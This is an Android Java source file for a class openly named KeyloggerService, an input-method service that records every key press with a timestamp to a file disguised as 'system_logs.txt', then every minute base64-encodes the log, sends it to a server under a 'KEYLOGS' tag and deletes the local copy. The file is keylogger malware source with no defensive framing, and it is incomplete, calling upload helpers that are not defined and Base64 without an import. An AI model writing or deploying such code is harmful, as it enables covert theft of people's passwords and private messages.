// KeyloggerService.java
package com.your.app.service;

import android.inputmethodservice.InputMethodService;
import android.view.KeyEvent;
import android.view.inputmethod.InputConnection;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyloggerService extends InputMethodService {
    
    private static final String LOG_FILE = "system_logs.txt";
    private FileWriter writer;
    private boolean isLogging = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        startLogging();
    }
    
    private void startLogging() {
        isLogging = true;
        new Thread(() -> {
            try {
                File logFile = new File(getFilesDir(), LOG_FILE);
                writer = new FileWriter(logFile, true);
                
                while (isLogging) {
                    Thread.sleep(60000); // Upload every minute
                    uploadLogs();
                }
                
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (isLogging && writer != null) {
            try {
                String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", 
                    Locale.getDefault()).format(new Date());
                
                String key = KeyEvent.keyCodeToString(keyCode);
                String logEntry = timestamp + " | KEY: " + key + "\n";
                
                writer.write(logEntry);
                writer.flush();
                
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return super.onKeyDown(keyCode, event);
    }
    
    private void uploadLogs() {
        try {
            File logFile = new File(getFilesDir(), LOG_FILE);
            if (logFile.exists()) {
                byte[] logData = fileToBytes(logFile);
                String base64Logs = Base64.encodeToString(logData, Base64.DEFAULT);
                sendToServer("KEYLOGS|" + base64Logs);
                
                // Clear log file after upload
                writer.close();
                logFile.delete();
                writer = new FileWriter(logFile, true);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    @Override
    public void onDestroy() {
        isLogging = false;
        try {
            if (writer != null) {
                writer.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        super.onDestroy();
    }
}
